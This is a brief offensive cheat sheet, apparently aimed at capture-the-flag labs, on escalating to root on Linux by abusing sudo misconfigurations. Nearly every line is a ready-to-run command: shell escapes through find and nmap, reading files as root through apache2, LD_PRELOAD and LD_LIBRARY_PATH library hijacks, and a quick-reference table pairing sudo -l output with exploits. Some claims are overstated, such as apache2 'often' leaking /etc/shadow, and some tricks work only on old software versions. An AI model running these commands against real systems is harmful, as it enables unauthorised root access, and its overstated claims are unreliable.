
## .Linux Privilege Escalation - Sudo Exploits
-------------------------------------------------

## Basic Command
sudo -l
### 1. Shell Escape
Works when `sudo -l` shows programs like `find`, `nmap`, `vim`, `less`, `awk`.
sudo find . -exec /bin/sh \; -quit
sudo nmap --interactive
!sh
-----------------------------------------------------
### 2. Apache2 File Read
Used when `sudo -l` shows `/usr/sbin/apache2`.
sudo apache2 -f /root/root.txt
This reads any file as root and often leaks `/etc/shadow` or flags.

------------------------------------------------------

### 3. LD_PRELOAD Hijack
Works when `sudo -l` shows `env_keep+=LD_PRELOAD`.
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c
sudo LD_PRELOAD=/tmp/preload.so apache2
### 4. LD_LIBRARY_PATH Hijack
Works when `sudo -l` shows `env_keep+=LD_LIBRARY_PATH`.
gcc -o /tmp/libcrypt.so.1 -shared -fPIC library_path.c
sudo LD_LIBRARY_PATH=/tmp apache2
### Quick Checklist
Output from `sudo -l`	Vulnerability	Quick Command
`find`, `nmap`, `vim`, `less`	Shell Escape	`sudo find . -exec /bin/sh \; -quit`
`apache2`	File Read	`sudo apache2 -f /root/root.txt`
`env_keep+=LD_PRELOAD`	Library Injection	`sudo LD_PRELOAD=/tmp/preload.so <any>`
`(ALL) NOPASSWD: ALL`	Full Access	`sudo su`
*Tip:* Search any binary from `sudo -l` on GTFOBins and check the `sudo` section.
